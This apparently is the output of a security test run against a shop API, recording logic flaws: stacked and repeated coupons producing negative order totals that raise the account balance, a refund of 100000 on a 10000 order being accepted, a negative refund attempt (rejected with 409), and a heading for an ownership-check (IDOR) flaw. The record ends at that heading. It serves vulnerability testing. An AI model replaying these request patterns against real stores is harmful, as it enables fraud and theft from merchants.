== A. stacked coupons make order total negative, balance grows ==
claimed: {'id': 1, 'code': 'SAVE60A'} {'id': 2, 'code': 'SAVE60B'} balance before: 20000
--- POST /orders/with-coupon [a1,a2]
HTTP 200 {"id":1,"total":-2000,"status":"placed"}
balance after: 22000 order row: {"id":1,"user_id":1,"product_id":1,"quantity":1,"total":-2000,"status":"placed","created_at":"2026-09-26 03:18:00"}

== B. same coupon id repeated in coupon_ids multiplies its discount ==
claimed: {'id': 3, 'code': 'SAVE60A'} balance before: 22000
--- POST /orders/with-coupon [a3,a3,a3,a3]
HTTP 200 {"id":2,"total":-14000,"status":"placed"}
balance after: 36000

== C. refund amount above remaining / above order total ==
--- POST /orders (plain, total 10000)
HTTP 200 {"id":3,"total":10000,"status":"placed"}
balance before refund: 26000
--- POST /orders/{id}/refund amount=100000
HTTP 200 {"id":1,"order_id":3,"amount":100000,"balance":126000}
balance after refund: 126000 summary: {"order_id":3,"paid":10000,"refund_count":1,"refunded":100000,"remaining":-90000}

== D. negative refund amount accepted ==
--- POST /orders/{id}/refund amount=-5000
HTTP 409 {"detail":"order already refunded"}
balance after: 126000 summary: {"order_id":3,"paid":10000,"refund_count":1,"refunded":100000,"remaining":-90000}

== E. /orders/{order_id} has no ownership check (IDOR) ==
